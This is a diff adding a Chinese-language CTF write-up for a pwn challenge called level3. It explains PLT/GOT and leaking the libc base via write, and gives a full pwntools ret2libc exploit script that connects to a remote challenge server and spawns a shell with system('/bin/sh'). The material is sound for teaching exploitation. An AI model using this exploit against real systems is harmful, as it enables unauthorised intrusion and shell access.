@@ -126,3 +126,67 @@ def execute():
 题目：菜鸡感觉这题似乎没有办法溢出，真的么?
 
 思路：比较密码长度时将长度保存到了寄存器al中，当长度为259时，高字节被丢弃，al中为3，满足密码要求，同时259长度的密码在后面复制时存在简单栈溢出
+
+
+### level3
+题目：libc!libc!这次没有system，你能帮菜鸡解决这个难题么?
+
+思路：存在栈溢出，需要通过libc定位system函数
+
+#### plt程序链接表，got全局偏移量表
+plt表是一组代码片段，在动态库中引入的函数对应会在plt表中有一小段代码，用于跳转到got表所指向的真实库函数地址。但是在库函数第一次调用前，got表并不真的指向真实地址，而是指向plt表中的下一条指令，通过该指令可以修改got表指向真实的库函数地址，从而实现动态链接，提高程序启动效率。
+
+#### system函数定位方法
+由于elf程序并没有引入system函数，因此无法通过plt表调用system函数，system函数在libc中的地址是已知的，但是由于libc库加载时的基地址不知道，那么应该如何定位system函数呢？关键就是libc的基址，而libc中某一个函数在got中的值和libc库中的地址的差值就是libc的基址！一般而言程序总会引入libc库中的函数，如write，因此我们可以利用溢出泄露write函数在got中的值，然后计算基址，再进一步计算system函数的实际地址。
+
+#### ROP攻击链
+由于通过write函数泄露出libc基址只在本次程序运行有效，因此还需要让程序继续运行，但是由于system函数此时还没计算出来，因此这里最好的方法是重新跳转到main函数，得到system函数地址后再利用栈溢出调用system("/bin/sh")获得shell，这里字符串的地址可以通过```ROPgadget --binary libc_32.so.6 --string "/bin/sh"```获得（同样需要加上基址）。全部代码如下：
+```python
+from pwn import *
+
+elf = ELF('level3')
+libc = ELF('libc_32.so.6')
+
+mainAddr = elf.sym['main']
+print('[*] main: 0x%08x' % mainAddr)
+writePlt = elf.plt['write']
+print('[*] write plt: 0x%08x' % writePlt)
+writeGot = elf.got['write']
+print('[*] write got: 0x%08x' % writeGot)
+
+p = remote('220.249.52.133', 31430)
+p.recvuntil('\n')
+
+payload = b''
+payload += b'A' * 0x88
+payload += b'A' * 4
+# ret
+payload += p32(writePlt)
+# write ret
+payload += p32(mainAddr)
+# write(1, writeGot, 4)
+payload += p32(1) + p32(writeGot) + p32(4)
+p.sendline(payload)
+
+writeGotValue = u32(p.recv())
+print('[*] write: 0x%08x' % writeGotValue)
+
+libBase = writeGotValue - libc.sym['write']
+systemGotValue = libBase + libc.sym['system']
+print('[*] system: 0x%08x' % systemGotValue)
+
+p.recvuntil('\n')
+payload = b''
+payload += b'A' * 0x88
+payload += b'A' * 4
+# ret
+payload += p32(systemGotValue)
+# system ret
+payload += b'AAAA'
+# system("/bin/sh")
+binshAddr = 0x0015902b + libBase
+payload += p32(binshAddr)
+p.sendline(payload)
+p.interactive()
+```
+
